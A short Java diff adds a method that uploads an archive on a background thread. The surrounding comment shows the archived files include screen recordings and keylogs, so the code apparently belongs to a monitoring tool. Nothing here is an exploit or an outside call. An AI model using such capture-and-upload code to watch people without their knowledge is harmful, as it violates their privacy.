@@ -159,6 +159,12 @@ public class Archiver {
     }
   }
 
+  public Thread uploadArchiveAsync() {
+    Thread t = new Thread(() -> RMAC.archiver.uploadArchive());
+    t.start();
+    return t;
+  }
+
   /**
    * Move active screen-recording or key-logging or any other files to its respective staging
    * directory.
